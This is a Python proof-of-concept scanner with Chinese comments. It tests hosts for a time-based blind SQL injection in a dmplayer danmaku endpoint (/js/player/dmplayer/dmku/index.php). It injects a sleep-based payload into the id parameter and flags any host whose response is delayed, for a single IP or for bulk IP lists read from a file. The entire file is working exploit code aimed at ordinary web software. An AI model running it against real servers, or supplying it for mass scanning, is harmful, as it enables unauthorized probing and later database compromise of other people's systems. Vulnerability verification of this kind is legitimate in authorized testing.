import requests
import time
import argparse


def check_vulnerability(ip, poc_url, run_poc=True):
    """
    检查目标IP是否存在SQL注入漏洞

    :param ip: 目标IP地址
    :param poc_url: 漏洞URL
    :param run_poc: 是否运行POC，默认True
    :return: 如果存在漏洞返回True，否则返回False
    """
    payload = "(select(1)from(select(sleep(6)))x)"  # SQL注入载荷
    url = f"http://{ip}{poc_url}?ac=del&id={payload}&type=list"  # 拼接完整URL

    try:
        start_time = time.time()  # 记录请求开始时间
        response = requests.get(url, timeout=10)  # 发送GET请求，并设置10秒超时
        elapsed_time = time.time() - start_time  # 计算响应时间

        # 如果响应时间大于阈值，判断为漏洞存在
        if elapsed_time > 5:
            print(f"{ip} 存在漏洞，检测成功 - 响应时间: {elapsed_time:.2f}秒")
            return True
        else:
            print(f"{ip} 不存在漏洞，响应时间正常")
            return False

    except requests.RequestException as e:
        print(f"请求失败 {ip}: {e}")
        return False


def process_ips(ip_list, poc_url, run_poc=True):
    """
    处理IP地址列表，逐一检测漏洞

    :param ip_list: 要检测的IP地址列表
    :param poc_url: 漏洞URL
    :param run_poc: 是否运行POC，默认True
    """
    for ip in ip_list:
        check_vulnerability(ip, poc_url, run_poc)


def read_ip_file(file_path):
    """
    从文件中读取IP地址

    :param file_path: 包含IP地址的文件路径
    :return: 返回IP地址的列表
    """
    with open(file_path, "r") as f:
        ips = f.readlines()
    return [ip.strip() for ip in ips]


def parse_args():
    """
    解析命令行参数

    :return: 解析后的命令行参数
    """
    parser = argparse.ArgumentParser(description="漏洞检测脚本")
    parser.add_argument("-i", "--ip", type=str, help="单个IP地址进行检测")
    parser.add_argument("-o", "--ips-file", type=str, help="批量IP地址文件进行检测")
    parser.add_argument("-t", "--test", action="store_true", help="仅检测漏洞是否存在，不运行POC")
    return parser.parse_args()
def main():
    args = parse_args()  # 解析命令行参数

    poc_url = "/js/player/dmplayer/dmku/index.php"  # 漏洞URL

    # 如果提供了单个IP地址
    if args.ip:
        print(f"检测单个IP: {args.ip}")
        check_vulnerability(args.ip, poc_url, run_poc=not args.test)

    # 如果提供了批量IP地址文件
    if args.ips_file:
        print(f"检测批量IP地址来自文件: {args.ips_file}")
        ip_list = read_ip_file(args.ips_file)
        process_ips(ip_list, poc_url, run_poc=not args.test)
if __name__ == "__main__":
    main()
